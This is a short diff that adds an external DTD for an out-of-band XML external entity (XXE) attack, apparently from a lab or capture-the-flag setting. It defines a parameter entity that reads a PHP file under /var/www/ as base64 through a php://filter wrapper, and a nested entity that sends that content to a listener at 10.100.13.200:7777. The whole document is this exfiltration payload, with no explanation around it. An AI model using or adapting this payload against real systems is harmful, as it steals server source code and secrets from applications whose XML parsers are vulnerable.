@@ -1,0 +1,3 @@
+<!ENTITY % out SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/
+me.terahost.exam/info.php">
+<!ENTITY % int "<!ENTITY &#x25; xxe SYSTEM 'http://10.100.13.200:7777/a=?%out;'>">
